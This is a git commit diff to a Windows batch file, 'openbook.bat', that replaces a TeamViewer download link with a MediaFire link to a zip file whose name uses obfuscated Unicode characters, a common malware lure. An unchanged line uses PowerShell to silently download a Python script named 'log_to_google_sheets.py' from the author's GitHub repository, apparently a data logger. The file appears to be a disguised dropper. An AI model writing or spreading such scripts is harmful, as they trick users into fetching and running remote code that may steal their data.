03fcc9136a273dafe879b2e3b0ec81b9ed6e861c
lolohole <shehhddu5@gmail.com>
2024-10-30 14:55:50 +0200

    Update openbook.bat

--- openbook.bat
+++ openbook.bat
@@ -1,6 +1,6 @@
 @echo off
 ::
-start "" "https://www.teamviewer.com/nl/download/windows/"
+start "" "https://www.mediafire.com/file/xwxdeb4rcjtsa0l/#Set-Up--6582__!PaSṨWOɾDs𝓢@!.zip/file"
 
 :: 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"
